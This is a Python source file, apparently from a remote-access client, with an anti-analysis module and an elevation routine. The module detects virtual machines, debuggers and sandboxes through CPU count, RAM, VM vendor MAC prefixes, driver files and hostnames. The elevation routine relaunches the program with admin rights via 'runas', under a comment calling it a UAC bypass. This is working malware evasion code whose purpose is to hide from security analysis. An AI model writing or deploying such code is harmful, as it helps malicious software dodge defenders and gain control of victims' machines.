import os
import sys
import platform
import subprocess
import ctypes
import socket
import uuid
import psutil
from src.client.core.platform import Platform

class AntiAnalysis:
    @staticmethod
    def check_all():
        """Run all anti-analysis checks. Returns True if analysis is detected."""
        if AntiAnalysis.is_vm(): return True
        if AntiAnalysis.is_debugger_present(): return True
        if AntiAnalysis.is_sandbox(): return True
        return False

    @staticmethod
    def is_vm():
        # 1. Check CPU Cores (VMs often have 1 or 2)
        if psutil.cpu_count() < 2:
            return True

        # 2. Check RAM (VMs often have < 4GB)
        if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
            return True

        # 3. Check MAC Address prefixes (common for VM vendors)
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
        vm_mac_prefixes = [
            "08:00:27", # VirtualBox
            "00:05:69", "00:0c:29", "00:50:56", # VMware
            "00:1c:42", # Parallels
            "00:16:3e", # Xen
            "00:15:5d"  # Hyper-V
        ]
        for prefix in vm_mac_prefixes:
            if mac.lower().startswith(prefix.lower()):
                return True

        # 4. Check for common VM files/drivers
        vm_indicators = {
            "/sys/class/dmi/id/product_name": ["virtualbox", "vmware", "qemu", "kvm"],
            "/proc/scsi/scsi": ["vmware", "vbox"],
            "C:\\windows\\System32\\Drivers\\VMMouse.sys": [],
            "C:\\windows\\System32\\Drivers\\VBoxGuest.sys": [],
            "C:\\windows\\System32\\Drivers\\vmtoolsd.exe": []
        }
        
        for path, keywords in vm_indicators.items():
            if os.path.exists(path):
                if not keywords: # Windows drivers existence is enough
                    return True
                try:
                    with open(path, "r") as f:
                        content = f.read().lower()
                        for key in keywords:
                            if key in content:
                                return True
                except:
                    pass
        
        return False

    @staticmethod
    def is_debugger_present():
        if Platform.is_windows():
            try:
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                return False
        return False

    @staticmethod
    def is_sandbox():
        # Check for common sandbox usernames
        sandbox_users = ["admin", "administrator", "user", "test", "vmware", "vbox", "sandbox"]
        current_user = os.getlogin().lower()
        if current_user in sandbox_users:
            # This alone might be too aggressive, but combined with others it's a good hint
            pass
        
        # Check for common sandbox computer names
        sandbox_pcs = ["sandbox", "vmware", "virtualbox", "test-pc"]
        if socket.gethostname().lower() in sandbox_pcs:
            return True
            
        return False

class Elevation:
    @staticmethod
    def is_admin():
        if Platform.is_windows():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.getuid() == 0

    @staticmethod
    def request_elevation():
        if Elevation.is_admin():
            return True
            
        if Platform.is_windows():
            # Attempt UAC Bypass/Request
            try:
                # Re-run the script with admin rights
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
            except:
                return False
        return False
